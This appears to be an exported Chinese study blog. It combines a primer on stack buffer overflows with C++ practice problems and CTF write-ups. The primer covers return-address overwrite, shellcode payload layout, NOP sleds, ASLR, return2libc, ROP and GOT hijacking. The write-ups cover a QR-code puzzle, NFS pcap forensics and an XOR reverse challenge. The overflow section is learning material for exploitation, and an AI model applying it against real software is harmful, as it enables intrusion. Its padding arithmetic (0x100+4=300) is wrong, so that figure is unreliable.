背景知识-函数调用栈函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。 函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。 函数调用发生和结束时调用栈的变化 函数状态主要涉及三个寄存器－－esp，ebp，eip。 esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。 ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。 eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。 下面是发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。 （1）子过程参数入栈：首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。（2）调用函数（父过程）的返回地址入栈：将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。（在执行完调用函数后回到主函数，能够继续执行主函数指令的指令地址）（3）将调用函数的基地址（ebp）入栈，并将当前栈顶地址传到ebp寄存器：将当前的ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。（4）将被调用函数的局部变量压入栈内在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。 函数调用结束时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。（1） 将被调用函数的局部变量弹出栈外：首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。（2）将调用函数（caller）的基地址（ebp）弹出栈外，并存到 ebp 寄存器内：将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。（3）将调用函数的返回地址弹出栈外，并存到 eip 寄存器内总过程总结为下图： 技术清单当函数正在执行内部指令的过程中无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是 eip，所以目标就是让 eip 载入攻击指令的地址。 函数调用结束时，如果要让 eip 指向攻击指令，需要哪些准备？ 首先，在退栈过程中，返回地址会被传给 eip，所以只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。 其次，可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。 函数调用发生时，如果要让 eip 指向攻击指令，需要哪些准备？ 这时，eip 会指向原程序中某个指定的函数，没法通过改写返回地址来控制了，不过可以“偷梁换柱”－－将原本指定的函数在调用时替换为其他函数。 一共包括下面的四种情况： 修改返回地址，让其指向溢出数据中的一段指令（shellcode） 修改返回地址，让其指向内存中已有的某个函数（return2libc） 修改返回地址，让其指向内存中已有的一段指令（ROP） 修改某个被调用函数的地址，让其指向另一个函数（hijack GOT） Shellcode(修改返回地址，让其指向溢出数据中的一段指令) 要完成的任务包括：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。攻击指令一般都是用来打开 shell，从而可以获得当前进程的控制权，所以这类指令片段也被成为“shellcode”。shellcode 可以用汇编语言来写再转成对应的机器码，也可以上网搜索直接复制粘贴。下面是溢出数据的组成，shellcode 所用溢出数据的构造。payload : padding1 + address of shellcode + padding2 + shellcode padding1 处的数据可以随意填充（注意如果利用字符串程序输入溢出数据不要包含 “\\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of shellcode 是后面 shellcode 起始处的地址，用来覆盖返回地址。padding2 处的数据也可以随意填充，长度可以任意。shellcode 应该为十六进制的机器码格式。 返回地址之前的填充数据（padding1）应该多长？ 我们可以用调试工具（例如 gdb）查看汇编代码来确定这个距离，也可以在运行程序时用不断增加输入长度的方法来试探（如果返回地址被无效地址例如“AAAA”覆盖，程序会终止并报错）。一般是缓冲区大小+ebp大小 [esp-0x100],32位机器时，ebp为4字节，所以填充数据大小为：0x100+4=300个字节 shellcode起始地址应该是多少？ 可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机），参见前面关于函数状态的解释），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下只能得到大致但不确切的 shellcode 起始地址，解决办法是在 padding2 里填充若干长度的 “\\x90”。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。这样就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。 操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即Address Space Layout Randomization (ASLR) ），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。","categories":[],"tags":[]},{"title":"每日一题 1009+vector容器","slug":"20190401","date":"2019-04-01T09:34:28.033Z","updated":"2019-04-01T09:35:48.721Z","comments":true,"path":"2019/04/01/20190401/","link":"","permalink":"https://hanqd.github.io/2019/04/01/20190401/","excerpt":"1009 说反话题目描述给定一句英语，要求你编写程序，将句中所有单词的顺序颠倒输出。","text":"1009 说反话题目描述给定一句英语，要求你编写程序，将句中所有单词的顺序颠倒输出。 输入格式：测试输入包含一个测试用例，在一行内给出总长度不超过 80 的字符串。字符串由若干单词和若干空格组成，其中单词是由英文字母（大小写有区分）组成的字符串，单词之间用 1 个空格分开，输入保证句子末尾没有多余的空格。 输出格式：每个测试用例的输出占一行，输出倒序后的句子。 题目分析输入样例：Hello World Here I Come输出样例：Come I Here World Hello由样例，可以想到用栈来解决，符合栈的先进后出的特点，还可以用vactor容器解决。 C++代码方法一：123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;stack&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;using namespace std;int main()&#123; char c; stack&lt;string&gt; s; //声明一个string类型的栈变量s string str; while(cin&gt;&gt;str) &#123; s.push(str);//str入栈 if((c=getchar())==&apos;\\n&apos;) break;//c接收入栈的单个字符，判断是否输入完毕 &#125; cout&lt;&lt;s.top();//输出栈顶元素 s.pop();//栈顶元素出栈 while(!s.empty()) &#123; cout&lt;&lt;&quot; &quot;&lt;&lt;s.top();//循环输出栈顶元素 s.pop();//栈顶元素出栈 &#125; return 0;&#125; getchar()函数作用：getchar()是到缓冲区读取第一个字符首先,从键盘输入许多字符,最后回车后,所有字符包括回车放到缓冲区这时才开始循环执行getchar(),读入一个字符判断是否回车,不是就继续读,是回车就退出循环(之所以说是顺序接受一行字符,是因为它取的始终是缓冲区中第一个字符,每取一个缓冲区的字符少一个,也就是顺序读取了) 方法二：vactor12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;stdio.h&gt;#include &lt;vector&gt;using namespace std;int main ()&#123; char c; vector&lt;string&gt; v;//相当于string v[]，数组长度不定 string str; while(cin&gt;&gt;str) &#123; v.insert(v.begin(),str);//向容器v中存入str字符串 if((c=getchar())==&apos;\\n&apos;) break; &#125; vector&lt;string&gt;::iterator i=v.begin(),end=v.end();//i指向v的首地址，区间是到最后一个元素 for(int j=v.size();j&gt;0;j--) &#123; cout&lt;&lt;*i;//输出i指针指向的内容 if(j!=1) cout&lt;&lt;&quot; &quot;; i++; &#125; return 0;&#125; vector(向量)C++中的一种数据结构,确切的说是一个类.它相当于一个动态的数组,当程序员无法知道自己需要的数组的规模多大时,用其来解决问题可以达到最大节约空间的目的. 用法: 文件包含:首先在程序开头处加上#include (vector)以包含所需要的类文件vector还有一定要加上using namespace std; 变量声明:2.1 例:声明一个int向量以替代一维的数组:vector (int) a;(等于声明了一个int数组a[],大小没有指定,可以动态的向里面添加删除)。2.2 例:用vector代替二维数组.其实只要声明一个一维数组向量即可,而一个数组的名字其实代表的是它的首地址,所以只要声明一个地址的向量即可,即:vector (int *) a.同理想用向量代替三维数组也是一样,vector (int**)a;再往上面依此类推. 具体的用法以及函数调用: push_back 在数组的最后添加一个数据 pop_back 去掉数组的最后一个数据 at 得到编号位置的数据 begin 得到数组头的指针 end 得到数组的最后一个单元+1的指针 front 得到数组头的引用 back 得到数组的最后一个单元的引用 max_size 得到vector最大可以是多大 capacity 当前vector分配的大小 size 当前使用数据的大小 resize 改变当前使用数据的大小，如果它比当前使用的大，者填充默认值 reserve 改变当前vecotr所分配空间的大小 erase 删除指针指向的数据项 clear 清空当前的vector rend 将vector反转构的结束指针返回(其实就是原来的begin-1) empty 判断vector是否为空 swap 与另一个vector交换数据 详细的函数实现功能：其中vector c. c.clear() 移除容器中所有数据。 c.empty() 判断容器是否为空。 c.erase(pos) 删除pos位置的数据 c.erase(beg,end) 删除[beg,end)区间的数据 c.front() 传回第一个数据。 c.insert(pos,elem) 在pos位置插入一个elem拷贝 c.pop_back() 删除最后一个数据。 c.push_back(elem) 在尾部加入一个数据。 c.resize(num) 重新设置该容器的大小 c.size() 回容器中实际数据的个数。 c.begin() 返回指向容器第一个元素的迭代器 c.end() 返回指向容器最后一个元素的迭代器 iteratoriterator是C++标准库（STL）中的迭代器可以把它理解成类似指针的东西~当然，只是用处差不多，使用方式和声明方式可是完全不同.","categories":[],"tags":[]},{"title":"每日一题 1008+pwn学习","slug":"每日一题1008","date":"2019-03-31T13:02:45.449Z","updated":"2019-03-31T13:03:40.801Z","comments":true,"path":"2019/03/31/每日一题1008/","link":"","permalink":"https://hanqd.github.io/2019/03/31/每日一题1008/","excerpt":"1008 数组元素循环右移问题题目描述一个数组A中存有N（&gt;0）个整数，在不允许使用另外数组的前提下，将每个整数循环向右移","text":"1008 数组元素循环右移问题题目描述一个数组A中存有N（&gt;0）个整数，在不允许使用另外数组的前提下，将每个整数循环向右移M（≥0）个位置，即将A中的数据由（A0 A1⋯AN−1）变换为（AN−M ⋯AN−1 A0 A1 ⋯AN−M−1）（最后M个数循环移至最前面的M个位置）。如果需要考虑程序移动数据的次数尽量少，要如何设计移动的方法？ 输入格式:每个输入包含一个测试用例，第1行输入N（1≤N≤100）和M（≥0）；第2行输入N个整数，之间用空格分隔。 输出格式:在一行中输出循环右移M位以后的整数序列，之间用空格分隔，序列结尾不能有多余空格。 题目分析方法一：可以直接在输入时改变输入顺序方法二：用数据结构中的链表中的reverse函数，进行反转注意：这里有m&gt;n的情况，需要对m进行处理，m=m%n，这样数组才不会出错。 C++代码方法一：1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;int main()&#123; int a[101]; int n,m; cin&gt;&gt;n&gt;&gt;m; if(m&gt;n) &#123; m=m%n; &#125; for(int i=m;i&lt;n;i++) &#123; cin&gt;&gt;a[i]; &#125; for(int i=0;i&lt;m;i++) &#123; cin&gt;&gt;a[i]; &#125; for(int i=0;i&lt;n-1;i++) &#123; cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;; &#125; cout&lt;&lt;a[n-1]; return 0;&#125; 方法二：1234567891011121314151617181920212223#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;int main()&#123; int n,m; cin&gt;&gt;n&gt;&gt;m; int *p=new int[n];//分配一块长度为n的内存，指针p指向这个数组的首址 for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;p[i]; &#125; m=m%n; reverse(p,p+n-m);//前n-m个数反转，由1 2 3 4-&gt;4 3 2 1 reverse(p+n-m,p+n);//后面的数反转，由5 6 -&gt;6 5 reverse(p,p+n);//n个数全反转 4 3 2 1 6 5 -&gt;5 6 1 2 3 4 for(int i=0;i&lt;n-1;i++) &#123; cout&lt;&lt;p[i]&lt;&lt;&quot; &quot;; &#125; cout&lt;&lt;p[n-1]; return 0;&#125; pwn学习从网上找了CTF关于pwn的解题类型，看了一些大佬的博客，对Ubuntu配置pwn的环境，可是！！各种包都按不上，更新源也出错，找了好多大学的替换源，也还是出错。。。。。明天再弄！","categories":[],"tags":[]},{"title":"每日一题 1007+Misc Another 01Game","slug":"每日一题","date":"2019-03-30T13:53:16.208Z","updated":"2019-03-30T13:55:49.572Z","comments":true,"path":"2019/03/30/每日一题/","link":"","permalink":"https://hanqd.github.io/2019/03/30/每日一题/","excerpt":"Another 01Game题目描述题目给了一个txt文件，里边只有01串。","text":"Another 01Game题目描述题目给了一个txt文件，里边只有01串。 解题思路题目给了思路：0和1的数量很关键，首先统计0和1的数量：1369.0/7 = 195.571428571428581369.0/8 = 171.1251369.0 ** 0.5 = 37.01369不是7和8的倍数，说明很可能和ASCII没关系。1369 是 37 的平方，说明可以由0和1正好组成一个正方形（二维码，QR code）。可以使用Python、MATLAB 等编程生成图片。扫描得到 另一个01字符串。统计字符串长度，可以当作 ASCII 编程解出 flag。 解题脚本12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env pythonimport qrcodeqr = qrcode.QRCode( version = 7, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4)qr.add_data('''0000000111011101100011011111010000000011111011011101111001100100101011111001000101011011101101000101010101000100100010110110011001101001010010100010010001011011001101000101010001010001001111101110001000011001010111101111100000000101010101010101010101010000000111111110110111010101100000011111111100010000011101110101010101010001110110001101110100010001010010100101010101011111001110010000110111000011110100111100011011100010110101001011101101001110100101101100101100110110110100010010010100100110010101110101010101010111111000000110111100001100111101000101001101110101110101110001010001010010011110010101011100010101111101001001101000111101000100110101010010011001010110000100000100010110010101010111010100101110101000100101110101010111010100000100000011001101010100011111010010100101011001100101010101110100100100100010010101101111010100111011001001001100010110011101000011110101110001011100000011110111010110001011111000010110001101110001001001010111101101000001111100111001000100110110100001101011001011011010001000011001011001100000010111000110110001011001010100000100011111111000011001010110011000111001010000000100111011101101110001010101000011111010100111001101010110101110001001000101001101110011001111100000001010100010110000011000011101010001000100010001010000010101001010101101000001001111101001100000101100011101000100110000000100101100100011011011001010110''')qr.make(fit=True)img = qr.make_image()img.save(\"test.png\") 扫码还是得到01字符串，有189个01，根据题目提示，每7个一组，前面加0，用ASCLL码解码即可。注意：flag中0和O的输入！！！ 1007 素数对猜想题目描述让我们定义dn为：dn=pn+1−pn，其中pi是第i个素数。显然有d1=1，且对于n&gt;1有dn是偶数。“素数对猜想”认为“存在无穷多对相邻且差为2的素数”。现给定任意正整数N(&lt;10^5)，请计算不超过N的满足猜想的素数对的个数。 输入格式输入在一行给出正整数N。 输出格式在一行中输出不超过N的满足猜想的素数对的个数。 题目分析算法很简单，就是先判断是否是素数，在相邻的两个数相减，为2则个数加1. C++代码123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;int main()&#123; int n; cin&gt;&gt;n; int count=0; int a=2,b=3; for(int i=5;i&lt;=n;i++) &#123; bool t=true; for(int j=2;j&lt;=sqrt(i);j++) &#123; if(i%j==0) &#123; t=false; break; &#125; &#125; if(t) &#123; a=b; b=i; if((b-a)==2) count++; &#125; &#125; cout&lt;&lt;count&lt;&lt;endl; return 0;&#125;","categories":[],"tags":[]},{"title":"每日一题 1006","slug":"每日一题1006","date":"2019-03-29T02:35:28.127Z","updated":"2019-03-29T02:37:13.602Z","comments":true,"path":"2019/03/29/每日一题1006/","link":"","permalink":"https://hanqd.github.io/2019/03/29/每日一题1006/","excerpt":"1006 换个格式输出整数题目描述让我们用字母 B 来表示“百”、字母 S 表示“十”，用 12…n 来表示不为零的个位数字 n（&lt;10），换个格式来输出任一个不超过 3 位的正整数。例如 234 应该被输出为 BBSSS1234，因为它有 2 个“百”、3 个“十”、以及个位的 4。","text":"1006 换个格式输出整数题目描述让我们用字母 B 来表示“百”、字母 S 表示“十”，用 12…n 来表示不为零的个位数字 n（&lt;10），换个格式来输出任一个不超过 3 位的正整数。例如 234 应该被输出为 BBSSS1234，因为它有 2 个“百”、3 个“十”、以及个位的 4。 输入格式每个测试输入包含 1 个测试用例，给出正整数 n（&lt;1000）。 输出格式每个测试用例的输出占一行，用规定的格式输出 n。 题目分析这是一道水题，分别用三个变量记录个、十、百位的数字，再分别输出即可。 C++代码12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;int main()&#123; int n; cin&gt;&gt;n; int b,s,g; b=n/100; s=(n/10)%10; g=n%10; for(int i=0;i&lt;b;i++) &#123; cout&lt;&lt;\"B\"; &#125; for(int i=0;i&lt;s;i++) &#123; cout&lt;&lt;\"S\"; &#125; for(int i=1;i&lt;=g;i++) &#123; cout&lt;&lt;i; &#125; cout&lt;&lt;endl; return 0;&#125;","categories":[],"tags":[]},{"title":"Misc：Forensics2（流量分析题）","slug":"Misc Forensics2","date":"2019-03-28T12:37:55.193Z","updated":"2019-03-28T12:38:57.870Z","comments":true,"path":"2019/03/28/Misc Forensics2/","link":"","permalink":"https://hanqd.github.io/2019/03/28/Misc Forensics2/","excerpt":"Forensics2题目描述题目给了一个.pcap文件，给了一句提示：是关于文件的。","text":"Forensics2题目描述题目给了一个.pcap文件，给了一句提示：是关于文件的。 题目分析 用wireshark软件打开文件，发现有很多协议，之前学的网络的知识也忘得差不多了。。。。决定先了解一下各个协议的功能。 ICMP：ICMP是（Internet Control Message Protocol）Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。在网络层。 ARP：地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。在网络层。 TCP：TCP（Transmission Control Protocol 传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议。在因特网协议族（Internet protocol suite）中，TCP层是位于IP层之上，应用层之下的中间层。当应用层向TCP层发送用于网间传输的、用8位字节表示的数据流，TCP则把数据流分割成适当长度的报文段，最大传输段大小（MSS）通常受该计算机连接的网络的数据链路层的最大传送单元（MTU）限制。之后TCP把数据包传给IP层，由它来通过网络将包传送给接收端实体的TCP层。在运输层。 SSH：SSH 为 Secure Shell 的缩写，SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。通过使用SSH，可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。 NFS：NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。在应用层 portmap端口映射是一个服务器，将RPC程序号转换为DARPA的协议端口号，在使用RPC调用时它必须运行。portmap进程的主要功能是把RPC程序号转化为Internet的端口号。 mount在Windows系统下的含义是：挂载文件到一个虚拟盘或一个虚拟文件夹中，通过访问这个虚拟盘或文件夹使用整个文件。 根据上述协议的功能和定义，猜测要找的文件在NFS协议共享的资源中，运用了SSH协议进行了加密。 对NFS协议进行过滤，如下图，找到flag.txt.gz，是一个压缩包形式。 在这条协议附件逐个分析每条协议传输的信息，最后在write那条中找到了data. 在data处右键-》显示分组字节-》选择压缩，即可得到flag。","categories":[],"tags":[]},{"title":"每日一题 1005","slug":"每日一题1005","date":"2019-03-28T07:28:08.741Z","updated":"2019-03-28T07:29:30.716Z","comments":true,"path":"2019/03/28/每日一题1005/","link":"","permalink":"https://hanqd.github.io/2019/03/28/每日一题1005/","excerpt":"1005 继续(3n+1)猜想题目描述卡拉兹(Callatz)猜想已经在1001中给出了描述。在这个题目里，情况稍微有些复杂。","text":"1005 继续(3n+1)猜想题目描述卡拉兹(Callatz)猜想已经在1001中给出了描述。在这个题目里，情况稍微有些复杂。当我们验证卡拉兹猜想的时候，为了避免重复计算，可以记录下递推过程中遇到的每一个数。例如对 n=3 进行验证的时候，我们需要计算 3、5、8、4、2、1，则当我们对 n=5、8、4、2 进行验证的时候，就可以直接判定卡拉兹猜想的真伪，而不需要重复计算，因为这 4 个数已经在验证3的时候遇到过了，我们称 5、8、4、2 是被 3“覆盖”的数。我们称一个数列中的某个数 n 为“关键数”，如果 n 不能被数列中的其他数字所覆盖。 现在给定一系列待验证的数字，我们只需要验证其中的几个关键数，就可以不必再重复验证余下的数字。你的任务就是找出这些关键数字，并按从大到小的顺序输出它们。 输入格式每个测试输入包含 1 个测试用例，第 1 行给出一个正整数 K (&lt;100)，第 2 行给出 K 个互不相同的待验证的正整数 n (1&lt;n≤100)的值，数字间用空格隔开。 输出格式每个测试用例的输出占一行，按从大到小的顺序输出关键数字。数字间用 1 个空格隔开，但一行中最后一个数字后没有空格。 题目分析输入样例：63 5 6 7 8 11输出样例：7 6根据输入和输出样例，可以看出，在验证3时，需要计算5、8、4、2，那么这四个数被3覆盖了，就不是关键数。6需要计算11，那么11不是关键数，6没有被输入的数覆盖，所以6是关键数。这道题就是输出在输入的数的计算过程中没有出现过的数。思路：把输入的值当做数组下标，这个以输入值作为下标的数组记录这个值出现的次数，在计算过程中没出现过，数组值设为1，出现过，数组值设为2。 C++代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;using namespace std;int main()&#123; int n; cin&gt;&gt;n; int a[n]; int xiabiao[101]=&#123;0&#125;; int keynum[100001]=&#123;0&#125;; int count=0,temp; //输入n个数 for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;a[i]; &#125; for(int i=0;i&lt;n;i++) &#123; int m=a[i]; //下标=数组值 if(xiabiao[m]==2) &#123; continue;//数组值出现过，即被某个数所覆盖 &#125; else xiabiao[m]=1;//没出现过的置1 while(m!=1) &#123; if(m%2==0) &#123; m=m/2; xiabiao[m]=2; &#125; else &#123; m=(m*3+1)/2; xiabiao[m]=2; &#125; &#125; &#125; //把xiabiao[]数组中值为1的存入另一个数组keynum[]，即所求的关键数 for(int i=0;i&lt;101;i++) &#123; if(xiabiao[i]==1) &#123; keynum[count]=i; count++; &#125; &#125; //对关键字排序，降序 for(int i=0;i&lt;count;i++) &#123; for(int j=i+1;j&lt;count;j++) &#123; if(keynum[i]&lt;keynum[j]) &#123; temp=keynum[i]; keynum[i]=keynum[j]; keynum[j]=temp; &#125; &#125; &#125; for(int k=0;k&lt;count-1;k++) &#123; cout&lt;&lt;keynum[k]&lt;&lt;&quot; &quot;; &#125; cout&lt;&lt;keynum[count-1]; return 0;&#125;","categories":[],"tags":[]},{"title":"CTF逆向reverse：Reverse sign in","slug":"reverse1","date":"2019-03-28T02:52:16.969Z","updated":"2019-03-28T02:57:29.140Z","comments":true,"path":"2019/03/28/reverse1/","link":"","permalink":"https://hanqd.github.io/2019/03/28/reverse1/","excerpt":"题目Reverse sign in题目描述题目中只给了一个rev1文件，其他的没有了。","text":"题目Reverse sign in题目描述题目中只给了一个rev1文件，其他的没有了。 题目分析 知道是个逆向题目，所以直接用ida打开该文件，Fn+F5反编译为c伪代码，得到如下图，知道flag就在sub_400686函数中。 查看sub_400686函数伪代码，如下 找到byte_400818数据，即为数组中的32个值 (char)(*(_BYTE *)(i + a1)在C语言中，内存地址也是用整数int表示（32bit）。因此，(BYTE *)(i+a1) 表示把整数(i+a1)强制转换为BYTE型数值的地址。 char *(i+a1) 即i+a1指向一个字符串常量 ^是在程序中是异或运算符号，即长度为32的数组与i进行异或运算 C++代码12345678910111213141516171819#include &lt;iostream&gt;using namespace std;int main()&#123; int b[]=&#123;0x66,0x6D, 0x63, 0x64, 0x7F, 0x3C, 0x36, 0x72, 0x57, 0x42, 0x64, 0x3B, 0x7B, 0x52, 0x7C, 0x3C, 0x66, 0x54, 0x60,0x60, 0x27, 0x4A, 0x49, 0x7F, 0x71, 0x58, 0x52, 0x72, 0x7D, 0x75, 0x2A, 0x62&#125;; char a[33]; for(int i=0;i&lt;=31;i++) &#123; a[i]= b[i]^i; &#125; for(int j=0;j&lt;=31;j++) &#123; cout&lt;&lt;a[j]; &#125; cout&lt;&lt;endl; return 0;&#125; 得到flag，注意：最后那个是两个_，输入时只输了一个，试了两遍！！！要细心啊~~~","categories":[],"tags":[]},{"title":"每日一题 1004","slug":"每日一题1004","date":"2019-03-27T03:00:27.982Z","updated":"2019-03-27T03:01:42.623Z","comments":true,"path":"2019/03/27/每日一题1004/","link":"","permalink":"https://hanqd.github.io/2019/03/27/每日一题1004/","excerpt":"1004 成绩排名题目描述读入 n（&gt;0）名学生的姓名、学号、成绩，分别输出成绩最高和成绩最低学生的姓名和学号。","text":"1004 成绩排名题目描述读入 n（&gt;0）名学生的姓名、学号、成绩，分别输出成绩最高和成绩最低学生的姓名和学号。 输入格式：每个测试输入包含 1 个测试用例，格式为第 1 行：正整数 n第 2 行：第 1 个学生的姓名 学号 成绩第 3 行：第 2 个学生的姓名 学号 成绩 … … …第 n+1 行：第 n 个学生的姓名 学号 成绩 其中姓名和学号均为不超过 10 个字符的字符串，成绩为 0 到 100 之间的一个整数，这里保证在一组测试用例中没有两个学生的成绩是相同的。 输出格式：对每个测试用例输出 2 行，第 1 行是成绩最高学生的姓名和学号，第 2 行是成绩最低学生的姓名和学号，字符串间有 1 空格。 题目解析：只需找到成绩最高和最低的学生，在和其学号和姓名对应起来即可。 C++代码：代码一：使用结构体1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;int main()&#123; //定义一个名字为student的结构体，有三个成员 struct student &#123; char a[11]; char b[11]; int grade; &#125;; //定义三个变量，结构体类型，其中s是所有学生，max是最大值，min是标记最小值的 student s,max,min; int n; cin&gt;&gt;n; cin&gt;&gt;s.a&gt;&gt;s.b&gt;&gt;s.grade; max=min=s; //先假设最大和最小值是第一个学生 //拿第一个的分数分别和其他n-1个学生相比 for(int i=1;i&lt;n;i++) &#123; cin&gt;&gt;s.a&gt;&gt;s.b&gt;&gt;s.grade; if(s.grade&gt;max.grade) max=s; if(s.grade&lt;min.grade) min=s; &#125; //max和min已经在上边的循环中指向最大最小的学生，在引用它们的成员即可 cout&lt;&lt;max.a&lt;&lt;&quot; &quot;&lt;&lt;max.b&lt;&lt;endl; cout&lt;&lt;min.a&lt;&lt;&quot; &quot;&lt;&lt;min.b&lt;&lt;endl; return 0;&#125; 代码二：123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;using namespace std;int main()&#123; int n; cin&gt;&gt;n; string a[n+1],b[n+1]; int grade[n]; int max=0,min=100,s,k;//s,k分别记录最大值和最小值的下标 for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;a[i]&gt;&gt;b[i]&gt;&gt;grade[i]; &#125; for(int j=0;j&lt;n;j++) &#123; if(grade[j]&gt;max) &#123; max=grade[j]; s=j; &#125; if(grade[j]&lt;min) &#123; min=grade[j]; k=j; &#125; &#125; cout&lt;&lt;a[s]&lt;&lt;&quot; &quot;&lt;&lt;b[s]&lt;&lt;endl; cout&lt;&lt;a[k]&lt;&lt;&quot; &quot;&lt;&lt;b[k]&lt;&lt;endl; return 0;&#125;","categories":[],"tags":[]},{"title":"Web calculator","slug":"Web calculate","date":"2019-03-26T12:39:08.259Z","updated":"2019-03-26T12:45:33.555Z","comments":true,"path":"2019/03/26/Web calculate/","link":"","permalink":"https://hanqd.github.io/2019/03/26/Web calculate/","excerpt":"Calculator题目描述","text":"Calculator题目描述 打开链接，网页如下 做题准备 安装requests库网址：http://cn.pythonrequests.org/zh_CN/latest/user/install.html#install我是Windows系统，选择安装的压缩包，解压缩后，把整个文件夹复制到Python的Lib目录下即可。 requests库的使用 http://cn.python-requests.org/zh_CN/latest/user/quickstart.html#url 题目分析要用1.5s计算出结果，并且每次刷新calculator，算数表达式都会变，那么按照平常的计算方式肯定是行不通的，根据题目提示，可以用requests库来解决，要解决的问题： 怎样从服务器那获得算术表达式，计算出结果？ 怎样把计算出的结果提交给服务器？ 让服务器知道获取算式和提交结果的是一个人？ 解题步骤 问题1：需要爬取网页信息，用正则表达式。（导入re模块）Python通过re模块提供对正则表达式的支持。使用re的一般步骤是先将正则表达式的字符串形式编译为Pattern实例，然后使用Pattern实例处理文本并获得匹配结果（一个Match实例），最后使用Match实例获得信息，进行其他的操作。 问题2：requests里的get传递 URL 参数你也许经常想为 URL 的查询字符串(query string)传递某种数据。如果是手工构建 URL，那么数据会以键/值对的形式置于 URL 中，跟在一个问号的后面。例如， httpbin.org/get?key=val。 Requests 允许你使用 params 关键字参数，以一个字符串字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么可以使用如下代码： 12payload = &#123;'key1': 'value1', 'key2': 'value2'&#125;r = requests.get(\"http://httpbin.org/get\", params=payload) 